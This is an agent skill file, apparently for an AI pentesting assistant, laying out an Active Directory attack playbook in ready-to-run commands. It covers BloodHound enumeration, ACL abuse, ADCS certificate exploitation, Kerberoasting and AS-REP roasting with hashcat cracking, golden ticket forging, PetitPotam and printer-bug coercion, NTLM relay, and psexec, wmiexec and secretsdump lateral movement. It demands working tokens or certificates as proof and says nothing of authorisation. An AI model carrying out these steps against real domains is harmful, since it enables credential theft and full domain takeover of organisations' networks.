---
name: losthex-ad
description: >-
  Active Directory — ACL abuse, ADCS, Kerberos, NTLM relay/coercion, lateral movement Windows/Linux. Triggers: Active Directory, Kerberos, ADCS, certificate services, NTLM relay, coercion, BloodHound, ACL abuse, lateral movement, domain takeover, DCSync.
---
# LostHex-AD

## Gate

```bash
python "$HOME/.workbuddy-ai/skills/losthex-hack/scripts/gate.py"   # bundled gate = HexStrike health check
# need: impacket, bloodhound, enum4linux-ng on Kali/WSL2
```

## 1) Enum + BloodHound

```bash
# anon / guest first
enum4linux-ng -A target -oJ enum.json
bloodhound-python -d domain.local -u user -p 'pass' -c all -ns dc.domain.local
# sharpHound (Windows)
.\SharpHound.exe -c All -d domain.local
# look in BloodHound for: shortest path to DA, ACL edges, ADCS templates
```

## 2) ACL Abuse

```bash
# GenericAll / GenericWrite / WriteDacl / ForceChangePassword
# check with bloodhound + dacledit.py
dacledit.py domain/user:pass@dc -action read -target targetuser
dacledit.py domain/user:pass@dc -action write -target targetuser -principal attacker
# ForceChangePassword -> changepwd.py
# AddMember -> net group / AddSelf
```

## 3) ADCS (ESC1-8)

```bash
certipy find -u user@domain.local -p 'pass' -dc-ip 10.0.0.1 -vuln
# ESC1: ClientAuth + no manager approval -> certipy req -template VulnTemplate -ca CA-NAME
# ESC8: relay NTLM to HTTP enrollment -> ntlmrelayx + petitpotam
# ESC4: write on template -> modify EKU
# ดู references: ADCS_ESC_MATRIX.md
```

## 4) Kerberos

```bash
# Kerberoast
GetUserSPNs.py domain/user:pass -dc-ip 10.0.0.1 -request -outputfile hashes.txt
hashcat -m 13100 hashes.txt wordlist

# AS-REP roast (no preauth)
GetNPUsers.py domain/ -usersfile users.txt -dc-ip 10.0.0.1 -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt wordlist

# Delegation / golden ticket (with krbtgt)
ticketer.py -nthash <hash> -domain-sid S-1-5-... -domain domain.local admin
```

## 5) NTLM Relay / Coercion

```bash
# coercion
petitpotam.py attacker@80 target_dc
printerbug.py domain/user:pass@target_dc attacker
# relay
ntlmrelayx.py -tf targets.txt -smb2support --escalate-user attacker
responder -I eth0
# ดู COERCION_METHODS.md สำหรับ matrix เต็ม
```

## 6) Lateral Movement

```bash
# Windows
psexec.py domain/user:pass@host
wmiexec.py domain/user:pass@host
secretsdump.py domain/user:pass@host
# Linux (if AD-joined)
# kerberos ticket -> kinit / secrets in /tmp
# ดู windows-lateral-movement + linux-lateral-movement
```

Verify: ทุก ESC/ACL ต้องมี cert หรือ token ที่ใช้ได้จริง ไม่ใช่แค่ find

Ponytail: ตัด cross-forest trust abuse — ceiling = single domain, upgrade เมื่อมี trust enum.